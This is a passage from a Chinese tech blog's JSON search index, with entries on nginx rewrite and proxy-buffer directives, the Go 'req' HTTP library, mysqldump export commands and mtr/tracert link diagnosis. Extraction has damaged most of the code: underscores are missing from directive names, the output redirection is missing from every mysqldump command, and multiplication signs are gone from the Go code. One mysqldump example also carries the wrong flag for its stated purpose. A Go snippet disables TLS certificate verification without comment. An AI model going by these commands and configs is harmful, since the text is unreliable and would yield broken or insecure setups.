^(/download/.)/media/(.)..$ $1/mp3/$2.mp3 break;\n     rewrite ^(/download/.)/audio/(.)..$ $1/mp3/$2.ra break;\n     return 403;\n }\n对于重写后的URL（replacement）包含原请求的请求参数，原URL的?后的内容。如果不想带原请求的参数 ，可以在replacement后加一个问号。如下，我们加了一个自定义的参数user=$1,然后在结尾处放了一个问号?,把原请的参数去掉。\nrewrite ^/users/(.)$ /show?user=$1? last;\n\n如果正则表达regex式中包含 “}” 或 “;”, 那么整个表达式需要用双引号或单引号包围.\nrewritelog指令\n\n语法：rewritelog on|off;\n默认值：rewritelog off;\n作用域：http,server,location,if\n开启或关闭以notice级别打印rewrite处理日志到error log文件。\n\nnginx打开rewrite log例子\n\nrewritelog on;\nerrorlog logs/xxx.error.log notice;\n\n1.打开rewrite on\n2.把error log的级别调整到 notice\nset指令\n\n语法：set variable value;\n默认值：none\n作用域：server,location,if\n定义一个变量并赋值，值可以是文本，变量或者文本变量混合体。\nuninitializedvariablewarn指令\n\n语法：uninitializedvariablewarn on | off;\n默认值：uninitializedvariable_warn on\n作用域：http,server,location,if","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx proxy buffer","title":"Linux命令 Nginx proxy cache","text":"【译】Ngnix实现一个缓存和缩略处理的反向代理服务器 - QueenKing - SegmentFault\nLinux 运维 » Nginx 代理 配置详解\n2  Proxy Buffer详解\nproxy buffer启用以后，nginx服务器会异步地将被failing服务器的响应数据传递给客户端，首先，nginx服务器会尽可能的从被代理服务器哪里接收响应数据，放在Proxy Buffer中\n2.1\nproxybuffering on|off;\n配置是否开启或关闭proxy buffer功能,默认为开启\n\n2.2\nproxybuffers number size;\n设置接收一次被代理服务器响应数据的proxy buffer个数和每个buffer的大小\nnumber 为个数\nsize 为打下你\n默认设置为\nproxybuffers 8 4k|8k;\n\n2.3\nproxybuffersize size;\n配置从被代理服务器获取的第一部分响应数据的大小\nsize 设置缓存的大小，保持与proxybuffers设置的size相同\n\n2.4\nproxybusybuffersseze size;\n限制同时处于BUSY状态的缓存区总大小，默认为8KB故意整个16KB\n\n2.5\nproxytemppath path .........;\n配置磁盘上的一个文件路径，用于零食存放服务器的大体积响应数据\npath 设置存放临时文件的路径\n..... 目录\neg :\n    proxytemppath /nginx/proxyweb/proxytemp 1 2;\n    临时文件存放目录为/nginx/proxyweb/proxytemp路径下的第二级目录中\n\n2.6\nproxymaxtempfilesize size;\n配置所有临时文件的总体积的大小，存放在磁盘上的临时文件大小不能超过该值\nsize设置大小，默认我1024MB\n\n2.7\nproxytempfilewrite_size size;\n配置同时写入临时文件的数据量的总大小，可以设置为8KB 16KB,一般与平台的内存页大小相同","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang req","title":"Go语言 request","text":"go get github.com/imroc/req\n\nreq\n\nGo语言人性化HTTP请求库\n\n特性\n\n轻量级\n简单\n容易操作JSON和XML\n容易调试和日志记录\n容易上传和下载文件\n容易管理Cookie\n容易设置代理\n容易设置超时\n容易自定义HTTP客户端\n\n安装\n\ngo get github.com/imroc/req\n\n概要\n\nreq 基于标准库 net/http 实现了一个友好的API.  \n\nReq 和 Resp 是两个最重要的结构体, 你可以把 Req 看作客户端， 把Resp 看作存放请求及其响应的容器，它们都提供许多简洁方便的API，让你可以很轻松做很多很多事情。\nfunc (r Req) Post(url string, v ...interface{}) (Resp, error)\n\n大多情况下，发起请求只有url是必选参数，其它都可选，比如请求头、请求参数、文件或请求体等。\n\n包中含一个默认的 Req 对象, 它所有的公有方法都被req包对应的公有方法包装了，所以大多数情况下，你直接可以吧req包看作一个Req对象来使用。\n// 创建Req对象来发起请求\nr := req.New()\nr.Get(url)\n\n// 直接使用req包发起请求\nreq.Get(url)\n你可以使用 req.New() 方法来创建 Req 作为一个单独的客户端\n\n例子\n\n基础用法  \n设置请求头  \n设置请求参数  \n设置请求体  \n调试  \n输出格式  \nToJSON \u0026 ToXML  \n获取 http.Response  \n上传  \n下载  \nCookie  \n设置超时  \n设置代理  \n自定义 http.Client  \n\n a name=\"Basic\"基础用法/a\nheader := req.Header{\n\t\"Accept\":        \"application/json\",\n\t\"Authorization\": \"Basic YWRtaW46YWRtaW4=\",\n}\nparam := req.Param{\n\t\"name\": \"imroc\",\n\t\"cmd\":  \"add\",\n}\n// 只有url必选，其它参数都是可选\nr, err = req.Post(\"http://foo.bar/api\", header, param)\nif err != nil {\n\tlog.Fatal(err)\n}\nr.ToJSON(\u0026foo)       // 响应体转成对象\nlog.Printf(\"%+v\", r) // 打印详细信息\n\na name=\"Set-Header\"设置请求头/a\n使用 req.Header (它实际上是一个 map[string]string)\nauthHeader := req.Header{\n\t\"Accept\":        \"application/json\",\n\t\"Authorization\": \"Basic YWRtaW46YWRtaW4=\",\n}\nreq.Get(\"https://www.baidu.com\", authHeader, req.Header{\"User-Agent\": \"V1.1\"})\n使用 http.Header\nheader := make(http.Header)\nheader.Set(\"Accept\", \"application/json\")\nreq.Get(\"https://www.baidu.com\", header)\n\n a name=\"Set-Param\"设置请求参数/a\nUse req.Param (它实际上是一个 map[string]interface{})\nparam := req.Param{\n\t\"id\":  \"imroc\",\n\t\"pwd\": \"roc\",\n}\nreq.Get(\"http://foo.bar/api\", param) // http://foo.bar/api?id=imroc\u0026pwd=roc\nreq.Post(url, param)                  // 请求体 =  id=imroc\u0026pwd=roc\n使用 req.QueryParam 强制将请求参数拼在url后面 (它实际上也是一个 map[string]interface{})\nreq.Post(\"http://foo.bar/api\", req.Param{\"name\": \"roc\", \"age\": \"22\"}, req.QueryParam{\"accesstoken\": \"fedledGF9Hg9ehTU\"})\n/\nPOST /api?accesstoken=fedledGF9Hg9ehTU HTTP/1.1\nHost: foo.bar\nUser-Agent: Go-http-client/1.1\nContent-Length: 15\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nAccept-Encoding: gzip\n\nage=22\u0026name=roc\n/\n\na name=\"Set-Body\"设置请求体/a\nPut string, []byte and io.Reader as body directly.\nreq.Post(url, \"id=roc\u0026cmd=query\")\n将对象作为JSON或XML请求体（自动添加 Content-Type 请求头）\nreq.Post(url, req.BodyJSON(\u0026foo))\nreq.Post(url, req.BodyXML(\u0026bar))\n\n a name=\"Debug\"调试/a\n将全局变量 req.Debug 设置为true，将会把所有请求的详细信息打印在标准输出。\nreq.Debug = true\nreq.Post(\"http://localhost/test\" \"hi\")\n\na name=\"Format\"输出格式/a\n您可以使用指定类型的输出格式在日志文件中记录请求和响应的信息。例如，在开发阶段使用％+v格式，可以让你观察请求和响应的细节信息。 在生产阶段使用％v或％-v输出格式，只记录所需要的信息。\n\n %+v 或 %+s\n详细输出\nr,  := req.Post(url, header, param)\nlog.Printf(\"%+v\", r) // 输出格式和Debug开启时的格式一样\n\n%v 或 %s\n简单输出（默认格式）\nr,  := req.Get(url, param)\nlog.Printf(\"%v\\n\", r) // GET http://foo.bar/api?name=roc\u0026cmd=add {\"code\":\"0\",\"msg\":\"success\"}\nlog.Prinln(r)         // 和上面一样\n\n %-v 或 %-s\n简单输出并保持所有内容在一行内（请求体或响应体可能包含多行，这种格式会将所有换行、回车替换成\" \", 这在会让你在查日志的时候非常有用）\n\nFlag\n你可以调用 SetFlags 控制输出内容，决定哪些部分能够被输出。\nconst (\n\tLreqHead  = 1 \u003c\u003c iota // 输出请求首部（包含请求行和请求头）\n\tLreqBody              // 输出请求体\n\tLrespHead             // 输出响应首部（包含响应行和响应头）\n\tLrespBody             // 输出响应体\n\tLcost                 // 输出请求所消耗掉时长\n\tLstdFlags = LreqHead | LreqBody | LrespHead | LrespBody\n)\nreq.SetFlags(req.LreqHead | req.LreqBody | req.LrespHead)\n\n 监控请求耗时\nreq.SetFlags(req.LstdFlags | req.Lcost) // 输出格式显示请求耗时\nr, := req.Get(url)\nlog.Println(r) // http://foo.bar/api 3.260802ms {\"code\":0 \"msg\":\"success\"}\nif r.Cost()   3  time.Second { // 检查耗时\n\tlog.Println(\"WARN: slow request:\", r)\n}\n\na name=\"ToJSON-ToXML\"ToJSON \u0026 ToXML/a\nr,  := req.Get(url)\nr.ToJSON(\u0026foo)\nr,  = req.Post(url, req.BodyXML(\u0026bar))\nr.ToXML(\u0026baz)\n\n a name=\"Response\"获取 http.Response/a\n// func (r Req) Response() http.Response\nr,  := req.Get(url)\nresp := r.Response()\nfmt.Println(resp.StatusCode)\n\na name=\"Upload\"上传/a\n使用 req.File 匹配文件\nreq.Post(url, req.File(\"imroc.png\"), req.File(\"/Users/roc/Pictures/.png\"))\n使用 req.FileUpload 细粒度控制上传\nfile,  := os.Open(\"imroc.png\")\nreq.Post(url, req.FileUpload{\n\tFile:      file,\n\tFieldName: \"file\",       // FieldName 是表单字段名\n\tFileName:  \"avatar.png\", // Filename 是要上传的文件的名称，我们使用它来猜测mimetype，并将其上传到服务器上\n})\n使用req.UploadProgress监听上传进度\nprogress := func(current, total int64) {\n\tfmt.Println(float32(current)/float32(total)100, \"%\")\n}\nreq.Post(url, req.File(\"/Users/roc/Pictures/.png\"), req.UploadProgress(progress))\nfmt.Println(\"upload complete\")\n\n a name=\"Download\"下载/a\nr,  := req.Get(url)\nr.ToFile(\"imroc.png\")\n使用req.DownloadProgress监听下载进度\nprogress := func(current, total int64) {\n\tfmt.Println(float32(current)/float32(total)100, \"%\")\n}\nr,  := req.Get(url, req.DownloadProgress(progress))\nr.ToFile(\"hello.mp4\")\nfmt.Println(\"download complete\")\n\na name=\"Cookie\"Cookie/a\n默认情况下，底层的 http.Client 会自动管理你的cookie（如果服务器给你发了cookie，之后的请求它会自动带上cookie请求头给服务器）, 你可以调用这个方法取消自动管理：\nreq.EnableCookie(false)\n你还可以在发送请求的时候自己传入 http.Cookie\ncookie := new(http.Cookie)\n// ......\nreq.Get(url, cookie)\n\n a name=\"Set-Timeout\"设置超时/a\nreq.SetTimeout(50  time.Second)\n\na name=\"Set-Proxy\"设置代理/a\n默认情况下，如果系统环境变量有 httpproxy 或 httpsproxy ，req会讲对应的地址作为对应协议的代理，你也可以自定义设置代理，或者将其置为nil，即取消代理。\nreq.SetProxy(func(r http.Request) (url.URL, error) {\n\tif strings.Contains(r.URL.Hostname(), \"google\") {\n\t\treturn url.Parse(\"http://my.vpn.com:23456\")\n\t}\n\treturn nil, nil\n})\n设置简单代理（将所有请求都转发到指定代理url地址上）\nreq.SetProxyUrl(\"http://my.proxy.com:23456\")\n\n a name=\"Customize-Client\"自定义HTTP客户端/a\n使用 SetClient 改变底层的 http.Client\nreq.SetClient(client)\n给某个请求制定特定的 http.Client\nclient := \u0026http.Client{Timeout: 30  time.Second}\nreq.Get(url, client)\n改变底层 http.Client 的某些属性\nreq.Client().Jar,  = cookiejar.New(nil)\ntrans, _ := req.Client().Transport.(http.Transport)\ntrans.MaxIdleConns = 20\ntrans.TLSHandshakeTimeout = 20 * time.Second\ntrans.DisableKeepAlives = true\ntrans.TLSClientConfig = \u0026tls.Config{InsecureSkipVerify: true}\n`","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 mysqldump","title":"mysqldump","text":"1.①导出一个库结构\nmysqldump -d dbname -u root -p   xxx.sql\n\n②导出多个库结构\nmysqldump -d -B dbname1 dbname2 -u root -p   xxx.sql\n\n2.①导出一个库数据\nmysqldump -t dbname -u root -p   xxx.sql\n\n②导出多个库数据\nmysqldump -t -B dbname1 dbname2 -u root -p   xxx.sql\n\n3.①导出一个库结构以及数据\nmysqldump dbname1 -u root -p   xxx.sql\n\n②导出多个库结构以及数据\nmysqldump -B dbname1 dbname2 -u root -p   xxx.sql\n\n———————————————-表操作———————————————-\n4.①导出一个表结构\nmysqldump -d dbname1 tablename1 -u root -p   xxx.sql\n\n②导出多个表结构\nmysqldump -d -B dbname1 --tables tablename1 tablename2 -u root -p   xxx.sql\n\n5.①导出一个表数据\nmysqldump -t dbname1 tablename1 -u root -p   xxx.sql\n\n②导出多个表数据\nmysqldump -d -B dbname1 --tables tablename1 tablename2 -u root -p   xxx.sql\n\n6.①导出一个表结构以及数据\nmysqldump dbname1 tablename1 -u root -p   xxx.sql\n\n②导出多个表结构以及数据\nmysqldump -B dbname1 --tables tablename1 tablename2 -u root -p   xxx.sql\n\n————————————–存储过程\u0026函数操作————————————-\n7.只导出存储过程和函数(不导出结构和数据，要同时导出结构的话，需要同时使用-d)\nmysqldump -R -ndt dbname1 -u root -p   xxx.sql\n\n———————————————-事件操作———————————————-\n8.只导出事件\nmysqldump -E -ndt dbname1 -u root -p   xxx.sql\n\n—————————————–触发器操作——————————————–\n9.不导出触发器（触发器是默认导出的–triggers，使用–skip-triggers屏蔽导出触发器）\nmysqldump --skip-triggers dbname1 -u root -p   xxx.sql\n\n————————————————————————————————\n10.导入\nmysql -u root -p\nuse game;\nsource xxx.sql\n\n————————————————————————————————\n总结一下：\n-d 结构(--no-data:不导出任何数据，只导出数据库表结构)\n\n-t 数据(--no-create-info:只导出数据，而不添加CREATE TABLE 语句)\n\n-n (--no-create-db:只导出数据，而不添加CREATE DATABASE 语句）\n\n-R (--routines:导出存储过程以及自定义函数)\n\n-E (--events:导出事件)\n\n--triggers (默认导出触发器，使用--skip-triggers屏蔽导出)\n\n-B (--databases:导出数据库列表，单个库时可省略）\n\n--tables 表列表（单个表时可省略）\n\n①同时导出结构以及数据时可同时省略-d和-t\n②同时 不 导出结构和数据可使用-ntd\n③只导出存储过程和函数可使用-R -ntd\n④导出所有(结构\u0026数据\u0026存储过程\u0026函数\u0026事件\u0026触发器)使用-R -E(相当于①，省略了-d -t;触发器默认导出)\n⑤只导出结构\u0026函数\u0026事件\u0026触发器使用 -R -E -d\n\nPS:如果可以使用相关工具，比如官方的MySQL Workbench，则导入导出都是极为方便的，如下图。（当然为了安全性，一般情况下都是屏蔽对外操作权限，所以需要使用命令的情况更多些）\n-d 没有数据 --add-drop-table 在每个create语句之前增加一个drop table","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 mtr链路测试","title":"Linux命令 mtr","text":"mtr 命令行工具\n\nmtr 命令行工具（建议优先使用）\n\nmtr （My traceroute）也是几乎所有 Linux 发行版本预装的网络测试工具。他把 ping和 traceroute 的功能并入了同一个工具中，所以功能更强大。\n\nmtr 默认发送 ICMP 数据包进行链路探测。可以通过 -u 参数来指定使用 UDP 数据包用于探测。\n\n相对于 traceroute 只会做一次链路跟踪测试，mtr 会对链路上的相关节点做持续探测并给出相应的统计信息。所以，mtr能避免节点波动对测试结果的影响，所以其测试结果更正确，建议优先使用。\n\n用法说明：\n\nmtr [-hvrctglspni46] [—help] [—version] [—report]                [—report-cycles=COUNT] [—curses] [—gtk]                [—raw] [—split] [—no-dns] [—address interface]                [—psize=bytes/-s bytes]                [—interval=SECONDS] HOSTNAME [PACKETSIZE]\n示例输出：\n\n[root@centos ~]# mtr 223.5.5.5                                  My traceroute  [v0.75]mycentos6.6 (0.0.0.0)                                             Wed Jun 15 23:16:27 2016Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                  Packets               Pings Host                                           Loss%   Snt   Last   Avg  Best  Wrst StDev 1. ??? 2. 192.168.17.20                                0.0%     7   13.1   5.6   2.1  14.7   5.7 3. 111.1.20.41                                  0.0%     7    3.0  99.2   2.7 632.1 235.4 4. 111.1.34.197                                 0.0%     7    1.8   2.0   1.2   2.9   0.6 5. 211.138.114.25                               0.0%     6    0.9   4.7   0.9  13.9   5.8 6. 211.138.114.70                               0.0%     6    1.8  22.8   1.8  50.8  23.6    211.138.128.134    211.138.114.2    211.138.114.66 7. 42.120.244.186                               0.0%     6    1.4   1.6   1.3   1.8   0.2    42.120.244.198 8. 42.120.244.246                               0.0%     6    2.8   2.9   2.6   3.2   0.2    42.120.244.242 9. ???10. 223.5.5.5                                    0.0%     6    2.7   2.7   2.5   3.2   0.3\n常见可选参数说明：\n\n-r 或 —report：以报告模式显示输出。\n-p 或 —split：将每次追踪的结果分别列出来，而非如 —report统计整个结果。\n-s 或 —psize：指定ping数据包的大小。\n-n 或 —no-dns：不对IP地址做域名反解析。\n-a 或 —address：设置发送数据包的IP地址。用于主机有多个IP时。\n-4：只使用 IPv4 协议。\n-6：只使用 IPv6 协议。\n另外，也可以在 mtr 运行过程中，输入相应字母来快速切换模式，比如：\n\n？或 h：显示帮助菜单。\nd：切换显示模式。\nn：切换启用或禁用 DNS 域名解析。\nu：切换使用 ICMP或 UDP 数据包进行探测。\n返回结果说明：\n\n默认配置下，返回结果中各数据列的说明：\n\n第一列（Host）：节点IP地址和域名。如前面所示，按n键可以切换显示。\n第二列（Loss%）：节点丢包率。\n第三列（Snt）：每秒发送数据包数。默认值是10，可以通过参数 -c 指定。\n第四列（Last）：最近一次的探测延迟值。\n第五、六、七列（Avg、Best、Wrst）：分别是探测延迟的平均值、最小值和最大值。\n第八列（StDev）：标准偏差。越大说明相应节点越不稳定。\nWindows 环境下链路测试工具介绍\n\nTRACERT 命令行工具\nWinMTR 工具（建议优先使用）\nTRACERT 命令行工具\n\nTRACERT (Trace Route) 是 Windows 自带的网络诊断命令行实用程序，用于跟踪 Internet 协议 (IP) 数据包传送到目标地址时经过的路径。\n\nTRACERT 通过向目标地址发送 ICMP 数据包来确定到目标地址的路由。在这些数据包中，TRACERT 使用了不同的 IP“生存期”(TTL) 值。由于要求沿途的路由器在转发数据包前至少必须将 TTL 减少 1，因此 TTL 实际上相当于一个跃点计数器 (hop counter)。当某个数据包的 TTL 达到零 (0) 时，相应节点就会向源计算机发送一个 ICMP“超时”的消息。\n\nTRACERT 第一次发送 TTL 为 1 的数据包，并在每次后续传输时将 TTL 增加 1，直到目标地址响应或达到 TTL 的最大值。中间路由器发送回来的 ICMP“超时”消息中包含了相应节点的信息。\n\n用法说明：\n\ntracert [-d] [-h maximumhops] [-j host-list] [-w timeout] [-R] [-S srcaddr] [-4] [-6] targetname\n示例输出：\n\nC:\\  tracert -d 223.5.5.5通过最多 30 个跃点跟踪到 223.5.5.5 的路由  1                          请求超时。  2     9 ms     3 ms    12 ms  192.168.17.20  3     4 ms     9 ms     2 ms  111.1.20.41  4     9 ms     2 ms     1 ms  111.1.34.197  5    11 ms                  211.140.0.57  6     3 ms     2 ms     2 ms  211.138.114.62  7     2 ms     2 ms     1 ms  42.120.244.190  8    32 ms     4 ms     3 ms  42.120.244.238  9                          请求超时。 10     3 ms     2 ms     2 ms  223.5.5.5跟踪完成。\n常见可选参数说明：\n\n-d：指定不将地址解析为主机名（禁用 DNS 反解）。\n-h：maximumhops，指定搜索目标地址时的最大跃点数。\n-j： host-list，指定沿主机列表的松散源路由。\n-w：timeout，由每个回复的 timeout 指定的等待毫秒数。\n-R：跟踪往返行程路径(仅适用于 IPv6)。\n-S：srcaddr，要使用的源地址(仅适用于 IPv6)。\n-4：强制使用 IPv4。\n-6：强制使用 IPv6。\ntargethost：目标主机域名或 IP 地址。\nWinMTR 工具（建议优先使用）\n\nWinMTR 是 mtr 工具在 Windows 环境下的图形化实现，但进行了功能简化，只支持 mtr部分参数的调整设置。WinMTR 默认发送ICMP 数据包进行探测，无法切换。\n\nWinMTR 可以从其官方网站下载获取。\n\n和 mtr 一样，相比 tracert，WinMTR 能避免节点波动对测试结果的影响，所以测试结果更正确。所以，在 WinMTR 可用的情况下，建议优先使用 WinMTR 进行链路测试。\n\n用法说明：\n\nWinMTR 无需安装，直接解压运行即可。操作方法非常简单，说明如下：\n\n如下图所示，运行程序后，在 Host 字段输入目标服务器域名或 IP（注意前面不要包含空格）。\n\n点击 Start 开始测试（开始测试后，相应按钮变成了 Stop）。\n运行一段时间后，点击 Stop 停止测试。\n其它选项说明：\nCopy Text to clipboard：将测试结果以文本格式复制到粘贴板。\nCopy HTML to clipboard：将测试结果以 HTML 格式复制到粘贴板。\nExport TEXT：将测试结果以文本格式导出到指定文件。\nExport HTML：将测试结果以 HTML 格式导出到指定文件。\nOptions：可选参数，包括：\nInterval（sec）：每次探测的间隔（过期）时间。默认为 1 秒。\nPing size(bytes)： ping 探测所使用的数据包大小，默认为 64 字节。、\nMax hosts in LRU list： LRU 列表支持的最大主机数，默认值为 128。\nResolve names：通过反查 IP 以域名显示相关节点。\n返回结果说明：\n\n默认配置下，返回结果中各数据列的说明：\n\n第一列（Hostname）：节点 IP 或域名。\n第二列（Nr）：节点编号。\n第三列（Loss%）：节点丢包率。\n第四列（Sent）：已发送的数据包数量。\n第五列（Recv）：已成功接收的数据包数量。\n第六、七、八、九列（Best 、Avg、Worst、Last）：分别是到相应节点延迟的最小值、平均值、最大值和最后一次值。\n第八列（StDev）：标准偏差。越大说明相应节点越不稳定。\n链路测试结果分析简要说明\n\n由于 mtr（WinMTR）有更高的准确性。本文以其测试结果为例，对链路测试结果的分析进行简要说明。\n\n后续说明，以如下链路测试结果示例图为基础进行阐述：\n\n对链路测试结果进行分析时，需要关注如下要点：\n\n网络区域\n链路负载均衡\n结合Avg（平均值）和 StDev（标准偏差）综合判断\nLoss%（丢包率）的判断\n关于延迟\n网络区域\n\n正常情况下，从客户端到目标服务器的整个链路，会显著的包含如下区域：\n\n客户端本地网络（本地局域网和本地网络提供商网络）：如前文链路测试结果示例图中的区域 A。如果该区域出现异常，如果是客户端本地网络相关节点出现异常，则需要对本地网络进行相应排查分析。否则，如果是本地网络提供商网络相关节点出现异常，则需要向当地运营商反馈问题。\n运营商骨干网络：如前文链路测试结果示例图中的区域 B。如果该区域出现异常，可以根据异常节点 IP 查询归属运营商，然后直接或通过阿里云售后技术支持，向相应运营商反馈问题。\n目标服务器本地网络（目标主机归属网络提供商网络）: 如前文链路测试结果示例图中的区域 C。如果该区域出现异常，则需要向目标主机归属网络提供商反馈问题。\n链路负载均衡\n\n如前文链路测试结果示例图中的区域 D 所示。如果中间链路某些部分启用了链路负载均衡，则 mtr 只会对首尾节点进行编号和探测统计。中间节点只会显示相应的 IP 或域名信息。\n\n结合Avg（平均值）和 StDev（标准偏差）综合判断\n\n由于链路抖动或其它因素的影响，节点的 Best 和 Worst 值可能相差很大。而 Avg（平均值） 统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。\n\n而 StDev（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以，标准偏差值可用于协助判断 Avg 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以，此时 Avg 并不能很好的反应出实际的网络质量情况。\n\n综上，建议的分析标准是：\n\n如果 StDev 很高，则同步观察相应节点的 Best 和 Wrst，来判断相应节点是否存在异常。\n如果 StDev 不高，则通过 Avg来判断相应节点是否存在异常。\n注：上述 StDev  “高”或者“不高”，并没有具体的时间范围标准。而需要根据同一节点其它列的延迟值大小来进行相对评估。比如，如果 Avg 为 30ms，那么，当 StDev 为 25ms，则认为是很高的偏差。而如果 Avg 为 325ms，则同样的 StDev（25ms），反而认为是不高的偏差。\nLoss%（丢包率）的判断\n\n任一节点的 Loss%（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种：\n\n运营商基于安全或性能需求，人为限制了节点的 ICMP 发送速率，导致丢包。\n节点确实存在异常，导致丢包。\n可以结合异常节点及其后续节点的丢包情况，来判定丢包原因：\n\n如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。如前文链路测试结果示例图中的第 2 跳所示。\n如果随后节点也出现丢包，则通常说明异常节点确实存在网络异常，导致丢包。如前文链路测试结果示例图中的第 5 跳所示。\n 另外，需要说明的是，前述两种情况可能同时发生。即相应节点既存在策略限速，又存在网络异常。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如前文链路测试结果示例图所示，在第 5、6、7跳均出现了丢包。所以，最终丢包情况，以第 7 跳的 40% 作为参考。\n\n关于延迟\n\n延迟跳变\n\n如果在某一跳之后延迟明显陡增，则通常判断该节点存在网络异常。如前文链路测试结果示例图所示，从第 5 跳之后的后续节点延迟明显陡增，则推断是第 5 跳节点出现了网络异常。\n\n不过，高延迟并不一定完全意味着相应节点存在异常。如前文链路测试结果示例图所示，第 5 跳之后，虽然后续节点延迟明显陡增，但测试数据最终仍然正常到达了目的主机。所以，延迟大也有可能是在数据回包链路中引发的。所以，最好结合反向链路测试一并分析。\n\nICMP 限速导致延迟增加\n\nICMP 策略限速也可能会导致相应节点的延迟陡增，但后续节点通常会恢复正常。如前文链路测试结果示例图所示，第 3 跳有 100% 的丢包率，同时延迟也明显陡增。但随后节点的延迟马上恢复了正常。所以判断该节点的延迟陡增及丢包是由于策略限速所致。\n\n常见链路异常场景和测试报告\n\n常见的链路异常场景及测试报告实例如下所示：\n\n目标主机网络配置不当\nICMP 限速\n环路\n链路中断\n目标主机网络配置不当\n\n示例数据：\n\nt@mycentos6 ~]# mtr —no-dns www.google.comMy traceroute  [v0.75]mycentos6.6 (0.0.0.0)                                             Wed Jun 15 19:06:29 2016Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                  Packets               Pings Host                                           Loss%   Snt   Last   Avg  Best  Wrst StDev 1. ??? 2. ??? 3. 111.1.20.41                                  0.0%     10  521.3  90.1   2.7 521.3 211.3 4. 111.1.34.209                                 0.0%     10    2.9   4.7   1.6  10.6   3.9 5. 211.138.126.29                              80.0%     10    3.0   3.0   3.0   3.0   0.0 6. 221.183.14.85                                0.0%     10    1.7   7.2   1.6  34.9  13.6 7. 221.183.10.5                                 0.0%     10    5.2   5.2   5.1   5.2   0.0    221.183.11.5 8. 221.183.23.26                                0.0%     10    5.3   5.2   5.1   5.3   0.1 9. 173.194.200.105                            100.0%     10    0.0   0.0   0.0   0.0   0.0\n在该示例中，数据包在目标地址出现了 100% 的丢包。乍一看是数据包没有到达，其实很有可能是目标服务器相关安全策略（比如防火墙、iptables 等）禁用了 ICMP 所致，导致目的主机无法发送任何应答。\n\n所以，该场景需要排查目标服务器的安全策略配置。\n\nICMP 限速\n\n示例数据：\n\n[root@mycentos6 ~]# mtr —no-dns www.google.comMy traceroute  [v0.75]mycentos6.6 (0.0.0.0)                                             Wed Jun 15 19:06:29 2016Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                  Packets               Pings Host                           Loss%   Snt   Last   Avg  Best  Wrst StDev1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.32. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.83. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.74. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.15. 72.14.233.56                 60.0%    10   27.2  25.3  23.1  26.4   2.96. 209.85.254.247                0.0%    10   39.1  39.4  39.1  39.7   0.27. 64.233.174.46                 0.0%    10   39.6  40.4  39.4  46.9   2.38. gw-in-f147.1e100.net          0.0%    10   39.6  40.5  39.5  46.7   2.2\n在该示例中，在第 5 跳出现了明显的丢包，但后续节点均未见异常。所以推断是该节点 ICMP 限速所致。\n\n该场景对最终客户端到目标服务器的数据传输不会有影响，所以，分析的时候可以忽略。\n\n环路\n\n示例数据：\n\n[root@mycentos6 ~]# mtr —no-dns www.google.comMy traceroute  [v0.75]mycentos6.6 (0.0.0.0)                                             Wed Jun 15 19:06:29 2016Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                  Packets               Pings Host                           Loss%   Snt   Last   Avg  Best  Wrst StDev1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.32. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.83. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.74. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.15. 72.14.233.56                  0.0%    10    0.0   0.0   0.0   0.0   0.06. 72.14.233.57                  0.0%    10    0.0   0.0   0.0   0.0   0.07. 72.14.233.56                  0.0%    10    0.0   0.0   0.0   0.0   0.08. 72.14.233.57                  0.0%    10    0.0   0.0   0.0   0.0   0.09 ???                            0.0%    10    0.0   0.0   0.0   0.0   0.0\n在该示例中，数据包在第 5 跳之后出现了循环跳转，导致最终无法到达目标服务器。这通常是由于运营商相关节点路由配置异常所致。\n\n所以，该场景需要联系相应节点归属运营商处理。\n\n链路中断\n\n示例数据：\n\nt@mycentos6 ~]# mtr —no-dns www.google.comMy traceroute  [v0.75]mycentos6.6 (0.0.0.0)                                             Wed Jun 15 19:06:29 2016Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                  Packets               Pings Host                           Loss%   Snt   Last   Avg  Best  Wrst StDev1. 63.247.74.43                  0.0%    10    0.3   0.6   0.3   1.2   0.32. 63.247.64.157                 0.0%    10    0.4   1.0   0.4   6.1   1.83. 209.51.130.213                0.0%    10    0.8   2.7   0.8  19.0   5.74. aix.pr1.atl.google.com        0.0%    10    6.7   6.8   6.7   6.9   0.15. ???                           0.0%    10    0.0   0.0   0.0   0.0   0.06. ???                           0.0%    10    0.0   0.0   0.0   0.0   0.07. ???                           0.0%    10    0.0   0.0   0.0   0.0   0.08. ???                           0.0%    10    0.0   0.0   0.0   0.0   0.09 ???                            0.0%    10    0.0   0.0   0.0   0.0   0.0\n在该示例中，数据包在第 4 跳之后就无法收到任何反馈。这通常是由于相应节点中断所致。建议结合反向链路测试做进一步确认。\n\n该场景需要联系相应节点归属运营商处理。\n\n链路测试步骤\n\n通常情况下，链路测试流程如下链路测试流程图所示：\n\n相关步骤详细说明如下：\n\n获取本地网络对应公网 IP\n正向链路测试（ping 和 mtr）\n反向链路测试（ping 和 mtr）\n测试结果分析\n获取本地网络对应公网 IP\n\n在客户端本地网络访问 ip.taobao.com 等网站，如下图，获取本地网络对应的公网 IP。\n\n正向链路测试（ping 和 